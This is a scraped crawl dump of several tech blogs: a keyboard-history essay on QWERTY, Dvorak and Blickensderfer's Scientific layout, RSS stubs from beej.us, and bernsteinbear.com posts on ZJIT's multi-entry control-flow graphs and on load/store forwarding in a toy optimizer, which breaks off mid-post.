Stanis\u0142aw Lem One hundred and thirty-seven seconds My translation of a short story by my favourite writer Memoirs of a train traveller The day I stalked Stanis\u0142aw Lem Stanis\u0142aw Lem on Google\u2019s homepage I coded and project-managed a unique doodle to celebrate Lem\u2019s work \u201cSneakers\u201d Toy company, my ass Trying to find a distinctive location from my favourite movie Fake trailer A \u201cmodernized\u201d Sneakers trailer based on Auralnauts\u2019s blockbuster trailer Press kit floppy I preserved a unique floppy disk that was attached to the \u201cSneakers\u201d press kit Appreciation The cursed universes of Dana Sibera On the creator of machines you\u2019ve never seen To save a keyboard, pt. 3 On my love for the Computer History Museum The William Langewiesche aviation reader Links to writing by one of my favourite non-fiction writers Books that are influencing my book From famous volumes to little quirky indie releases</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:15</p>"},{"location":"aresluna.org/The%20primitive%20tortureboard/","title":"The primitive tortureboard","text":"<p>\u6765\u6e90: aresluna.org \u53d1\u5e03\u65f6\u95f4: \u94fe\u63a5: https://aresluna.org/the-primitive-tortureboard</p> <p>The primitive tortureboard Untangling the myths and mysteries of Dvorak and QWERTY This essay was originally published in December 2023 as sixth chapter of the book Shift Happens . 1 There weren\u2019t many who hated QWERTY more. To his credit, there was a lot to hate. The layout seemed random, with letters strewn around without rhyme or reason. Watching someone type on it felt painful: fingers flailed wildly all over the place, common letters far away from the home row necessitated more travel, and there were long stretches of one hand doing all the work while the other sat idle. Adding insult to injury, it wasn\u2019t even really that difficult to spot someone using a QWERTY-wearing typewriter. The layout was already so ubiquitous, it was known as \u201cthe universal keyboard.\u201d But he felt it didn\u2019t deserve to be. \u201cIt would be difficult to design a key-board over which the hands must travel farther,\u201d he said. There was nothing smart about it; QWERTY \u201cwas not arranged on any principle, but resulted from the necessity of humoring the construction of the early machine.\u201d He wanted to build a principled keyboard instead. Eventually, after much deliberation, he did so. He arranged the most common letters in one row, so the hands didn\u2019t have to leave it except for rarer letters, which represented only 30% of characters typed: \u201cThe hands travel over the least possible distance. Almost all word endings are close to the spacebar.\u201d Switching to the new keyboard would save 15% of typing time, and the training wouldn\u2019t take long. The keyboard \u201ccan be memorized and high speed attained on it in one-quarter the time required for the Universal.\u201d It was a great keyboard with a great layout. He could\u2019ve called it by his name \u2013 George C. Blickensderfer \u2013 but he had a better one. If the other keyboard was Universal, his would be Scientific. The Scientific keyboard was unveiled in 1893 at the World\u2019s Columbian Exposition in Chicago, attached to a few brand-new typewriters. Those were named after him. Blickensderfer Model 1 was the fully featured model, with some other interesting ideas: an implement for easier line-drawing, automatic word spacing, and extra keys like The , And , and Other that output short words. There was a simpler version, the Model 3, and even the tiny Model 5 had a few interesting features: instead of swinging typebars, it had a type wheel that would rotate when a typist pressed keys. The wheel could be swapped out, which meant you could easily type in many different fonts, and in many different languages. All three typewriters were fascinating, and Blickensderfer already had a track record of being an inventor that knew how to follow through. But he could not afford more than a small booth at an exposition of twenty-two other typewriter manufacturers \u2013 and bad luck would put his right next to Remington\u2019s lavish display. Little did he know in 1893 that the rest of his career would be defined by bad luck, too. The high hopes for Model 1 never materialized \u2013 all the interest and preorders went towards the dirt-cheap, minuscule Model 5. Not that it was bad, of course. The typewriter gained an affectionate nickname: \u201cBlick 5,\u201d or \u201cthe five-pound secretary.\u201d It was a bit clumsy, but also portable and affordable. It struck an interesting balance of features and set a price point between cheap, cumbersome index typewriters, and big-featured desktop machines like Remington\u2019s. \u201cThere are few old typewriters with as much charm,\u201d mentioned one collector more recently. Blickensderfer \u21165 in its case. Courtesy Martin Howard Blickensderfer wasn\u2019t done inventing by then. His later, fascinating Blick Oriental could not only type in two alphabets, but one of them \u2013 Hebrew \u2013 printed right to left. In 1902, he created one of the first electric typewriters in history, the Blickensderfer Electric. And then, there was also the Niagara \u2013 a typewriter that produced coded messages, aimed at the lucrative diplomatic and military markets. In an alternate universe, all of them matured and became product lines that set the tone of the industry for decades. But not in this one. The Oriental was great, but it had limited market appeal. The Electric appeared too early when people were still unaccustomed to electricity. The Niagara\u2019s cipher, advertised as unbreakable and purportedly built over the course of nine years, was cracked within twenty-four hours by a government code expert. The Scientific keyboard wasn\u2019t having that much luck, either. The layout, also known as DHIA\u00adTENSOR \u2013 named for the bottom row of home keys holding the most popular vowels and consonants right under the typist\u2019s fingertips \u2013 proved unpopular with customers already used to QWERTY. Four years after its introduction, Blickensderfer began offering an option to furnish his typewriters with the dreaded, unprincipled universal keyboard. (A rumor started that he even requested such customers to sign a release claiming he wasn\u2019t liable for any bad consequences of using QWERTY.) A few years later, he was forced to go further, offering an option to convert a Scientific keyboard to a Universal for a mere six dollars. This option was presented in the catalog with a wistful and never exercised \u201cor vice versa.\u201d And even then, Blickensderfer backed the wrong horse, his QWERTY machines equipped with three banks of keys and two rows, a combination already losing the Shift Wars on people\u2019s desks. The adoption of touch typing and the runaway success of the Underwood would soon cement four banks as the only viable option \u2013 and just when Blickensderfer introduced that, too, World War I stopped his production and killed all the exports of the prior machines. The final nail in the coffin was a new portable entrant, the Corona 3, that took away most of the domestic market. Blickensderfer \u21166 typewriters with Scientific and QWERTY keyboards Courtesy Martin Howard and Bwilson888 George Blickensderfer\u2019s military inventions kept the company going through the Great War, but he himself did not see the end of it. He died in 1917. In the words of one of the historians, his passing \u201cripped the heart out of the company.\u201d The production of most of the machines ended then. In 1921, Remington, the company whose fair booth dwarfed the introduction of his first three typewriters \u2013 and the creator of the Universal keyboard \u2013 bought the factory and the patents. After 28 years, the dream of the Scientific Key-Board was gone. 2 Stop me if you\u2019ve heard any of the following claims before. QWERTY was completely random, put together without any thought. Or, if there was any reasoning behind it, it was just putting all the letters necessary to spell T-Y-P-E-W-R-I-T-E-R in the top row, to make it easy to wow customers. How about this version: QWERTY was built to slow the typist down as the early typewriters could not handle high typing speeds, attained by moving frequent pairs of letters as far away as possible. QWERTY was, basically, the worst layout possible. It was built without any ergonomic considerations. It wasn\u2019t great for touch typing. I bet you also heard of the keyboard layout that was the opposite of all the above \u2013 the mythical Dvorak keyboard. It was just what Blickensderfer once wanted, only even better. It was the perfect layout , put together with thought and care. It was efficient and comfortable. It was made for touch typing. It allowed the typists to reach 180wpm, fast enough to write down people\u2019s words as they were speaking . But it wasn\u2019t undone by bad luck \u2013 it was sabotaged by typewriter companies and typewriter teachers. Or, if it wasn\u2019t, it was still better than QWERTY, and the market treated it unfairly. The fact that none of us type on a Dvorak today is one of the keyboard universe\u2019s biggest injustices. Some of those arguments are true, some not. Funnily enough, many of them are neither . Let\u2019s unpeel the QWERTY and Dvorak myths and understand why the story is much more complicated than it appears, and much more interesting than most people give it credit for. The first challenge: neither Sholes nor any of his inner-circle compatriots wrote a book, a paper, or even left behind notes explaining why QWERTY looks the way it does. This wasn\u2019t an academic project, or a side interest. They were running a business. Sharing wasn\u2019t necessary and could be corporate suicide. Either way, sharing would also distract from the hard, multi-year task of designing a typewriter. Today, we can only piece the story from a scant few letters, patent applications, and models \u2013 plus a lot of informed speculation to fill in the blanks. 3 Some facts are certain. Early typewriter prototypes, the ones still looking like a piano, started in the most obvious, alphabetical order (or, at rare times, reversed alphabetical). Sholes had problems with some typebars bumping into one another while typing, and he started rearranging the letters to alleviate the issues. Remington made the last few changes after Sholes and Densmore gave them the rights to produce the machine. There\u2019s also the evidence of a tiny 1878 prototype typewriter used to test different typebar suspension ideas. That typewriter only has two rows of six keys each. The top one goes S O H L W I , and the bottom one R D T P E Y . These don\u2019t seem like particularly exciting keys, except if you realize they can write a pertinent phrase: \u201cSHOLES TYPEWRITER.\u201d But this was a tiny throwaway machine. As for the real typewriter, we\u2019ve discovered enough models, patents, and illustrations to tell us the last four years of QWERTY evolution looked something like these layouts: Historians don\u2019t know if changes proceeded in that exact order \u2013\u00a0or whether some of them were transcription mistakes. But there\u2019s enough smoke to know for sure there must have been fire: QWERTY did evolve between 1872 and 1876, and it\u2019s likely its emergence started years before. Even if we don\u2019t quite understand it yet, it no longer feels that the layout was just an act of randomness \u2013 we can see a definite pr</p> <p>... (\u5185\u5bb9\u5df2\u622a\u65ad)</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 08:41:14</p>"},{"location":"beej.us/","title":"beej.us\\n\\n\u7f51\u7ad9: https://beej.us\\nRSS: https://beej.us/blog/rss.xml\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- Rust RPN Calculator_20260205\\n- Exploring Rust Traits_20260205\\n- Using Virtual Environments in Python_20260205\\n- Stop Using DRM on your Books_20260205\\n- Adding Mastodon Comments to your Blog_20260205\\n","text":""},{"location":"beej.us/Adding%20Mastodon%20Comments%20to%20your%20Blog_20260205/","title":"Adding Mastodon Comments to your Blog\\n\\n\u6765\u6e90: https://beej.us\\n\u94fe\u63a5: http://beej.us/blog/data/mastodon-comments/\\n\u65e5\u671f: Fri, 21 Feb 2025 00:00:00 +0000\\n\\n---\\n\\nComments powered by Mastodon? Yes, please!","text":""},{"location":"beej.us/Exploring%20Rust%20Traits_20260205/","title":"Exploring Rust Traits\\n\\n\u6765\u6e90: https://beej.us\\n\u94fe\u63a5: http://beej.us/blog/data/rust-trait-impl/\\n\u65e5\u671f: Fri, 17 Oct 2025 00:00:00 +0000\\n\\n---\\n\\nJust randomly rabbit-holing down into how traits work in Rust.","text":""},{"location":"beej.us/Rust%20RPN%20Calculator_20260205/","title":"Rust RPN Calculator\\n\\n\u6765\u6e90: https://beej.us\\n\u94fe\u63a5: http://beej.us/blog/data/rust-rpn-calc/\\n\u65e5\u671f: Fri, 24 Oct 2025 00:00:00 +0000\\n\\n---\\n\\nAnother Rust rabbit hole digging into some RPN calculator code.","text":""},{"location":"beej.us/Stop%20Using%20DRM%20on%20your%20Books_20260205/","title":"Stop Using DRM on your Books\\n\\n\u6765\u6e90: https://beej.us\\n\u94fe\u63a5: http://beej.us/blog/data/on-drm/\\n\u65e5\u671f: Thu, 09 Oct 2025 00:00:00 +0000\\n\\n---\\n\\nWhy not to protect your books with DRM.","text":""},{"location":"beej.us/Using%20Virtual%20Environments%20in%20Python_20260205/","title":"Using Virtual Environments in Python\\n\\n\u6765\u6e90: https://beej.us\\n\u94fe\u63a5: http://beej.us/blog/data/python-venv/\\n\u65e5\u671f: Sat, 11 Oct 2025 00:00:00 +0000\\n\\n---\\n\\nA short how-to with just the basics to get going.","text":""},{"location":"bernsteinbear.com/","title":"bernsteinbear.com\\n\\n\u7f51\u7ad9: https://bernsteinbear.com\\nRSS: https://bernsteinbear.com/feed.xml\\n\\n---\\n\\n## \u6700\u65b0\u6587\u7ae0\\n\\n- Sorry for marking all the posts as unread_20260205\\n- A multi-entry CFG design conundrum_20260205\\n- The GDB JIT interface_20260205\\n- Load and store forwarding in the Toy Optimizer_20260205\\n- ZJIT is now available in Ruby 4.0_20260205\\n","text":""},{"location":"bernsteinbear.com/A%20multi-entry%20CFG%20design%20conundrum_20260205/","title":"A multi-entry CFG design conundrum\\n\\n\u6765\u6e90: https://bernsteinbear.com\\n\u94fe\u63a5: https://bernsteinbear.com/blog/multiple-entry/?utm_source=rss\\n\u65e5\u671f: Thu, 22 Jan 2026 00:00:00 +0000\\n\\n---\\n\\nBackground and bytecode design\\nThe ZJIT compiler compiles Ruby bytecode (YARV) to machine code. It starts by","text":"<p>transforming the stack machine bytecode into a high-level graph-based intermediate representation called HIR.\\nWe use a more or less typical\\n1\\ncontrol-flow graph (CFG) in HIR. We have a compilation unit,\\nFunction\\n, which has multiple basic blocks,\\nBlock\\n. Each block contains multiple instructions,\\nInsn\\n. HIR is always in SSA form, and we use the variant of SSA with block parameters instead of phi nodes.\\nWhere it gets weird, though, is our handling of multiple entrypoints. See, YARV handles default positional parameters (but\\nnot\\ndefault keyword parameters) by embedding the code to compute the defaults inside the callee bytecode. Then callers are responsible for figuring out what offset in the bytecode they should start running the callee, depending on the amount of arguments the caller provides.\\n2\\nIn the following example, we have a function that takes two optional positional parameters\\na\\nand\\nb\\n. If neither is provided, we start at offset\\n0000\\n. If just\\na\\nis provided, we start at offset\\n0005\\n. If both are provided, we can start at offset\\n0010\\n.\\n$ ruby --dump=insns -e 'def foo(a=compute_a, b=compute_b) = a + b' ... == disasm: #&lt;ISeq:foo@-e:1 (1,0)-(1,41)&gt; local table (size: 2, argc: 0 [opts: 2, rest: -1, post: 0, block: -1, kw: -1@-1, kwrest: -1]) [ 2] a@0 [ 1] b@1 0000 putself                                                          (   1) 0001 opt_send_without_block    0003 setlocal_WC_0            a@0 0005 putself 0006 opt_send_without_block    0008 setlocal_WC_0            b@1 0010 getlocal_WC_0            a@0[Ca] 0012 getlocal_WC_0            b@1 0014 opt_plus                 [CcCr] 0016 leave                    [Re] $\\n(See the jump table debug output:\\n[ 2] a@0 [ 1] b@1\\n)\\nUnlike in Python, where default arguments are evaluated\\nat function creation time\\n, Ruby computes the default values\\nat function call time\\n. For this reason, embedding the default code inside the callee makes a lot of sense; we have a full call frame already set up, so any exception handling machinery or profiling or \u2026 doesn\u2019t need special treatment.\\nSince the caller knows what arguments it is passing, and often to what function, we can efficiently support this in the JIT. We just need to know what offset in the compiled callee to call into. The interpreter can also call into the compiled function, which just has a stub to do dispatch to the appropriate entry block.\\nThis has led us to design the HIR to support\\nmultiple function entrypoints\\n. Instead of having just a single entry block, as most control-flow graphs do, each of our functions now has an array of function entries: one for the interpreter, at least one for the JIT, and more for default parameter handling. Each of these entry blocks is separately callable from the outside world.\\nHere is what the (slightly cleaned up) HIR looks like for the above example:\\nOptimized HIR: fn foo@tmp/branchnil.rb:4: bb0():   EntryPoint interpreter   v1:BasicObject = LoadSelf   v2:BasicObject = GetLocal :a, l0, SP@5   v3:BasicObject = GetLocal :b, l0, SP@4   v4:CPtr = LoadPC   v5:CPtr[CPtr(0x16d27e908)] = Const CPtr(0x16d282120)   v6:CBool = IsBitEqual v4, v5   IfTrue v6, bb2(v1, v2, v3)   v8:CPtr[CPtr(0x16d27e908)] = Const CPtr(0x16d282120)   v9:CBool = IsBitEqual v4, v8   IfTrue v9, bb4(v1, v2, v3)   Jump bb6(v1, v2, v3) bb1(v13:BasicObject):   EntryPoint JIT(0)   v14:NilClass = Const Value(nil)   v15:NilClass = Const Value(nil)   Jump bb2(v13, v14, v15) bb2(v27:BasicObject, v28:BasicObject, v29:BasicObject):   v65:HeapObject[...] = GuardType v27, HeapObject[class_exact:Object@VALUE(0x1043aed00)]   v66:BasicObject = SendWithoutBlockDirect v65, :compute_a (0x16d282148)   Jump bb4(v27, v66, v29) bb3(v18:BasicObject, v19:BasicObject):   EntryPoint JIT(1)   v20:NilClass = Const Value(nil)   Jump bb4(v18, v19, v20) bb4(v38:BasicObject, v39:BasicObject, v40:BasicObject):   v69:HeapObject[...] = GuardType v38, HeapObject[class_exact:Object@VALUE(0x1043aed00)]   v70:BasicObject = SendWithoutBlockDirect v69, :compute_b (0x16d282148)   Jump bb6(v38, v39, v70) bb5(v23:BasicObject, v24:BasicObject, v25:BasicObject):   EntryPoint JIT(2)   Jump bb6(v23, v24, v25) bb6(v49:BasicObject, v50:BasicObject, v51:BasicObject):   v73:Fixnum = GuardType v50, Fixnum   v74:Fixnum = GuardType v51, Fixnum   v75:Fixnum = FixnumAdd v73, v74   CheckInterrupts   Return v75\\nIf you\u2019re not a fan of text HIR, here is an embedded clickable visualization of HIR thanks to our former intern\\nAiden\\nporting Firefox\u2019s\\nIongraph\\n:\\n(You might have to scroll sideways and down and zoom around. Or you can\\nopen it in its own window\\n.)\\nEach entry block also comes with block parameters which mirror the function\u2019s parameters. These get passed in (roughly) the System V ABI registers.\\nThis is kind of gross. We have to handle these blocks specially in reverse post-order (RPO) graph traversal. And, recently, I ran into an even worse case when trying to implement the Cooper-style \u201cengineered\u201d dominator algorithm: if we walk backwards in block dominators, the walk is not guaranteed to converge. All non-entry blocks are dominated by all entry blocks, which are only dominated by themselves. There is no one \u201cstart block\u201d. So what is there to do?\\nThe design conundrum\\nApproach 1\\nis to keep everything as-is, but handle entry blocks specially in the dominator algorithm too. I\u2019m not exactly sure what would be needed, but it seems possible. Most of the existing block infra could be left alone, but it\u2019s not clear how much this would \u201cspread\u201d within the compiler. What else in the future might need to be handled specially?\\nApproach 2\\nis to synthesize a super-entry block and make it a predecessor of every interpreter and JIT entry block. Inside this approach there are two ways to do it: one (\\n2.a\\n) is to fake it and report some non-existent block. Another (\\n2.b\\n) is to actually make a block and a new instruction that is a quasi-jump instruction. In this approach, we would either need to synthesize fake block arguments for the JIT entry block parameters or add some kind of new\\nLoadArg\\ninstruction that reads the argument\\ni\\npassed in.\\n(suggested by Iain Ireland, as seen in the IBM COBOL compiler)\\nApproach 3\\nis to duplicate the entire CFG per entrypoint. This would return us to having one entry block per CFG at the expense of code duplication. It handles the problem pretty cleanly but then\\nforces\\ncode duplication. I think I want the duplication to be opt-in instead of having it be the only way we support multiple entrypoints. What if it increases memory too much? The specialization probably would make the generated code faster, though.\\n(suggested by Ben Titzer)\\nNone of these approaches feel great to me. The probable candidate is\\n2.b\\nwhere we have\\nLoadArg\\ninstructions. That gives us flexibility to also later add full specialization without forcing it.\\nCameron Zwarich also notes that this this is an analogue to the common problem people have when implementing the reverse: postdominators. This is because often functions have multiple return IR instructions. He notes the usual solution is to transform them into branches to a single return instruction.\\nDo you have this problem? What does your compiler do?\\nWe use extended basic blocks (EBBs), but this doesn\u2019t matter for this post. It makes dominators and predecessors slightly more complicated (now you have dominating\\ninstructions\\n), but that\u2019s about it as far as I can tell. We\u2019ll see how they fare in the face of more complicated analysis later.\\n\u21a9\\nKeyword parameters have some mix of caller/callee presence checks in the callee because they are passed in un-ordered. The caller handles simple constant defaults whereas the callee handles anything that may raise. Check out\\nKevin Newton\u2019s awesome overview\\n.\\n\u21a9"},{"location":"bernsteinbear.com/Load%20and%20store%20forwarding%20in%20the%20Toy%20Optimizer_20260205/","title":"Load and store forwarding in the Toy Optimizer\\n\\n\u6765\u6e90: https://bernsteinbear.com\\n\u94fe\u63a5: https://bernsteinbear.com/blog/toy-load-store/?utm_source=rss\\n\u65e5\u671f: Wed, 24 Dec 2025 00:00:00 +0000\\n\\n---\\n\\nAnother entry in the\\nToy Optimizer series\\n.\\nA long, long time ago (two years!)\\nCF Bolz-Tereick\\nand I made a\\nvideo","text":"<p>about load/store forwarding\\nand an accompanying\\nGitHub Gist\\nabout load/store forwarding (also called load elimination) in the Toy Optimizer. I said I would write a blog post about it, but never found the time\u2014it got lost amid a sea of large life changes.\\nIt\u2019s a neat idea: do an abstract interpretation over the trace, modeling the heap at compile-time, eliminating redundant loads and stores. That means it\u2019s possible to optimize traces like this:\\nv0 = ... v1 = load(v0, 5) v2 = store(v0, 6, 123) v3 = load(v0, 6) v4 = load(v0, 5) v5 = do_something(v1, v3, v4)\\ninto traces like this:\\nv0 = ... v1 = load(v0, 5) v2 = store(v0, 6, 123) v5 = do_something(v1, 123, v1)\\n(where\\nload(v0, 5)\\nis equivalent to\\n(v0+5)\\nin C syntax and\\nstore(v0, 6, 123)\\nis equvialent to\\n(v0+6)=123\\nin C syntax)\\nThis indicates that we were able to eliminate two redundant loads by keeping around information about previous loads and stores. Let\u2019s get to work making this possible.\\nThe usual infrastructure\\nWe\u2019ll start off with the usual infrastructure from the\\nToy Optimizer series\\n: a very stringly-typed representation of a\\ntrace-based SSA IR\\nand a union-find rewrite mechanism.\\nThis means we can start writing some new optimization pass and our first test:\\ndef\\noptimize_load_store\\n(\\nbb\\n:\\nBlock\\n):\\nopt_bb\\n=\\nBlock\\n()\\n# TODO: copy an optimized version of bb into opt_bb\\nreturn\\nopt_bb\\ndef\\ntest_two_loads\\n():\\nbb\\n=\\nBlock\\n()\\nvar0\\n=\\nbb\\n.\\ngetarg\\n(\\n0\\n)\\nvar1\\n=\\nbb\\n.\\nload\\n(\\nvar0\\n,\\n0\\n)\\nvar2\\n=\\nbb\\n.\\nload\\n(\\nvar0\\n,\\n0\\n)\\nbb\\n.\\nescape\\n(\\nvar1\\n)\\nbb\\n.\\nescape\\n(\\nvar2\\n)\\nopt_bb\\n=\\noptimize_load_store\\n(\\nbb\\n)\\nassert\\nbb_to_str\\n(\\nopt_bb\\n)\\n==\\n\"\"\"\\n\\nvar0 = getarg(0) var1 = load(var0, 0) var2 = escape(var1) var3 = escape(var1)\"\"\"\\nThis test is asserting that we can remove duplicate loads. Why load twice if we can cache the result? Let\u2019s make that happen.\\nCaching loads\\nTo do this, we\u2019ll model the the heap at compile-time. When I say \u201cmodel\u201d, I mean that we will have an imprecise but correct abstract representation of the heap: we don\u2019t (and can\u2019t) have knowledge of every value, but we can know for sure that some addresses have certain values.\\nFor example, if we have observed a load from object\\nO\\nat offset\\n8\\nv0 = load(O, 8)\\n, we know that the SSA value\\nv0\\nis at\\nheap[(O, 8)]\\n. That sounds tautological, but it\u2019s not. Future loads can make use of this information.\\ndef\\nget_num\\n(\\nop\\n:\\nOperation\\n,\\nindex\\n:\\nint\\n=\\n1\\n):\\nassert\\nisinstance\\n(\\nop\\n.\\narg\\n(\\nindex\\n),\\nConstant\\n)\\nreturn\\nop\\n.\\narg\\n(\\nindex\\n).\\nvalue\\ndef\\noptimize_load_store\\n(\\nbb\\n:\\nBlock\\n):\\nopt_bb\\n=\\nBlock\\n()\\n# Stores things we know about the heap at... compile-time.\\n# Key: an object and an offset pair acting as a heap address\\n# Value: a previous SSA value we know exists at that address\\ncompile_time_heap\\n:\\nDict\\n[\\nTuple\\n[\\nValue\\n,\\nint\\n],\\nValue\\n]\\n=\\n{}\\nfor\\nop\\nin\\nbb\\n:\\nif\\nop\\n.\\nname\\n==\\n\"load\"\\n:\\nobj\\n=\\nop\\n.\\narg\\n(\\n0\\n)\\noffset\\n=\\nget_num\\n(\\nop\\n,\\n1\\n)\\nload_info\\n=\\n(\\nobj\\n,\\noffset\\n)\\nprevious\\n=\\ncompile_time_heap\\n.\\nget\\n(\\nload_info\\n)\\nif\\nprevious\\nis\\nnot\\nNone\\n:\\nop\\n.\\nmake_equal_to\\n(\\nprevious\\n)\\ncontinue\\ncompile_time_heap\\n[\\nload_info\\n]\\n=\\nop\\nopt_bb\\n.\\nappend\\n(\\nop\\n)\\nreturn\\nopt_bb\\nThis pass records information about loads and uses the result of a previous cached load operation if available. We treat the pair of (SSA value, offset) as an address into our abstract heap.\\nThat\u2019s great! If you run our simple test, it should now pass. But what happens if we store into that address before the second load? Oops\u2026\\ndef\\ntest_store_to_same_object_offset_invalidates_load\\n():\\nbb\\n=\\nBlock\\n()\\nvar0\\n=\\nbb\\n.\\ngetarg\\n(\\n0\\n)\\nvar1\\n=\\nbb\\n.\\nload\\n(\\nvar0\\n,\\n0\\n)\\nvar2\\n=\\nbb\\n.\\nstore\\n(\\nvar0\\n,\\n0\\n,\\n5\\n)\\nvar3\\n=\\nbb\\n.\\nload\\n(\\nvar0\\n,\\n0\\n)\\nbb\\n.\\nescape\\n(\\nvar1\\n)\\nbb\\n.\\nescape\\n(\\nvar3\\n)\\nopt_bb\\n=\\noptimize_load_store\\n(\\nbb\\n)\\nassert\\nbb_to_str\\n(\\nopt_bb\\n)\\n==\\n\"\"\"\\n\\nvar0 = getarg(0) var1 = load(var0, 0) var2 = store(var0, 0, 5) var3 = load(var0, 0) var4 = escape(var1) var5 = escape(var3)\"\"\"\\nThis test fails because we are incorrectly keeping around\\nvar1\\nin our abstract heap. We need to get rid of it and not replace\\nvar3\\nwith\\nvar1\\n.\\nInvalidating cached loads\\nSo it turns out we have to also model stores in order to cache loads correctly. One valid, albeit aggressive, way to do that is to throw away all the information we know at each store operation:\\ndef\\noptimize_load_store\\n(\\nbb\\n:\\nBlock\\n):\\nopt_bb\\n=\\nBlock\\n()\\ncompile_time_heap\\n:\\nDict\\n[\\nTuple\\n[\\nValue\\n,\\nint\\n],\\nValue\\n]\\n=\\n{}\\nfor\\nop\\nin\\nbb\\n:\\nif\\nop\\n.\\nname\\n==\\n\"store\"\\n:\\ncompile_time_heap\\n.\\nclear\\n()\\nelif\\nop\\n.\\nname\\n==\\n\"load\"\\n:\\n# ...\\nopt_bb\\n.\\nappend\\n(\\nop\\n)\\nreturn\\nopt_bb\\nThat makes our test pass\u2014yay!\u2014but at great cost. It means any store operation mucks up redundant loads. In our world where we frequently read from and write to objects, this is what we call a huge bummer.\\nFor example, a store to offset 4 on some object should never interfere with a load from a different offset on the same object\\n1\\n. We should be able to keep our load from offset 0 cached here:\\ndef\\ntest_store_to_same_object_different_offset_does_not_invalidate_load\\n():\\nbb\\n=\\nBlock\\n()\\nvar0\\n=\\nbb\\n.\\ngetarg\\n(\\n0\\n)\\nvar1\\n=\\nbb\\n.\\nload\\n(\\nvar0\\n,\\n0\\n)\\nvar2\\n=\\nbb\\n.\\nstore\\n(\\nvar0\\n,\\n4\\n,\\n5\\n)\\nvar3\\n=\\nbb\\n.\\nload\\n(\\nvar0\\n,\\n0\\n)\\nbb\\n.\\nescape\\n(\\nvar1\\n)\\nbb\\n.\\nescape\\n(\\nvar3\\n)\\nopt_bb\\n=\\noptimize_load_store\\n(\\nbb\\n)\\nassert\\nbb_to_str\\n(\\nopt_bb\\n)\\n==\\n\"\"\"\\n\\nvar0 = getarg(0) var1 = load(var0, 0) var2 = store(var0, 4, 5) var3 = escape(var1) var4 = escape(var1)\"\"\"\\nWe could try instead checking if our specific (object, offset) pair is in the heap and only removing cached information about that offset and that object. That would definitely help!\\ndef\\noptimize_load_store\\n(\\nbb\\n:\\nBlock\\n):\\nopt_bb\\n=\\nBlock\\n()\\ncompile_time_heap\\n:\\nDict\\n[\\nTuple\\n[\\nValue\\n,\\nint\\n],\\nValue\\n]\\n=\\n{}\\nfor\\nop\\nin\\nbb\\n:\\nif\\nop\\n.\\nname\\n==\\n\"store\"\\n:\\nload_info\\n=\\n(\\nop\\n.\\narg\\n(\\n0\\n),\\nget_num\\n(\\nop\\n,\\n1\\n))\\nif\\nload_info\\nin\\ncompile_time_heap\\n:\\ndel\\ncompile_time_heap\\n[\\nload_info\\n]\\nelif\\nop\\n.\\nname\\n==\\n\"load\"\\n:\\n# ...\\nopt_bb\\n.\\nappend\\n(\\nop\\n)\\nreturn\\nopt_bb\\nIt makes our test pass, too, which is great news.\\nUnfortunately, this runs into problems due to aliasing: it\u2019s entirely possible that our compile-time heap could contain a pair\\n(v0, 0)\\nand a pair\\n(v1, 0)\\nwhere\\nv0\\nand\\nv1\\nare the same object (but not known to the optimizer). Then we might run into a situation where we incorrectly cache loads because the optimizer doesn\u2019t know our abstract addresses\\n(v0, 0)\\nand\\n(v1, 0)\\nare actually the same pointer at run-time.\\nThis means that we are breaking abstract interpretation rules: our abstract interpreter has to correctly model\\nall\\npossible outcomes at run-time. This means to me that we should instead pick some tactic in-between clearing all information (correct but over-eager) and clearing only exact matches of object+offset (incorrect).\\nThe term that will help us here is called an\\nalias class\\n. It is a name for a way to efficiently partition objects in your abstract heap into completely disjoint sets. Writes to any object in one class never affect objects in another class.\\nOur very scrappy alias classes will be just based on the offset: each offset is a different alias class. If we write to any object at offset K, we have to invalidate all of our compile-time offset K knowledge\u2014even if it\u2019s for another object. This is a nice middle ground, and it\u2019s possible because our (made up) object system guarantees that distinct objects do not overlap, and also that we are not writing out-of-bounds.\\n2\\nSo let\u2019s remove all of the entries from\\ncompile_time_heap\\nwhere the offset matches the offset in the current\\nstore\\n:\\ndef\\noptimize_load_store\\n(\\nbb\\n:\\nBlock\\n):\\nopt_bb\\n=\\nBlock\\n()\\ncompile_time_heap\\n:\\nDict\\n[\\nTuple\\n[\\nValue\\n,\\nint\\n],\\nValue\\n]\\n=\\n{}\\nfor\\nop\\nin\\nbb\\n:\\nif\\nop\\n.\\nname\\n==\\n\"store\"\\n:\\noffset\\n=\\nget_num\\n(\\nop\\n,\\n1\\n)\\ncompile_time_heap\\n=\\n{\\nload_info\\n:\\nvalue\\nfor\\nload_info\\n,\\nvalue\\nin\\ncompile_time_heap\\n.\\nitems\\n()\\nif\\nload_info\\n[\\n1\\n]\\n!=\\noffset\\n}\\nelif\\nop\\n.\\nname\\n==\\n\"load\"\\n:\\n# ...\\nopt_bb\\n.\\nappend\\n(\\nop\\n)\\nreturn\\nopt_bb\\nGreat! Now our test passes.\\nThis concludes the load optimization section of the post. We have modeled enough of loads and stores that we can eliminate redundant loads. Very cool. But we can go further.\\nCaching stores\\nStores don\u2019t just invalidate information. They also give us new information! Any time we see an operation of the form\\nv1 = store(v0, 8, 5)\\nwe also learn that\\nload(v0, 8) == 5\\n! Until it gets invalidated, anyway.\\nFor example, in this test, we can eliminate the load from\\nvar0\\nat offset 0:\\ndef\\ntest_load_after_store_removed\\n():\\nbb\\n=\\nBlock\\n()\\nvar0\\n=\\nbb\\n.\\ngetarg\\n(\\n0\\n)\\nbb\\n.\\nstore\\n(\\nvar0\\n,\\n0\\n,\\n5\\n)\\nvar1\\n=\\nbb\\n.\\nload\\n(\\nvar0\\n,\\n0\\n)\\nvar2\\n=\\nbb\\n.\\nload\\n(\\nvar0\\n,\\n1\\n)\\nbb\\n.\\nescape\\n(\\nvar1\\n)\\nbb\\n.\\nescape\\n(\\nvar2\\n)\\nopt_bb\\n=\\noptimize_load_store\\n(\\nbb\\n)\\nassert\\nbb_to_str\\n(\\nopt_bb\\n)\\n==\\n\"\"\"\\n\\nvar0 = getarg(0) var1 = store(var0, 0, 5) var2 = load(var0, 1) var3 = escape(5) var4 = escape(var2)\"\"\"\\nMaking that work is thankfully not very hard; we need only add that new information to the compile-time heap after removing all the potentially-aliased 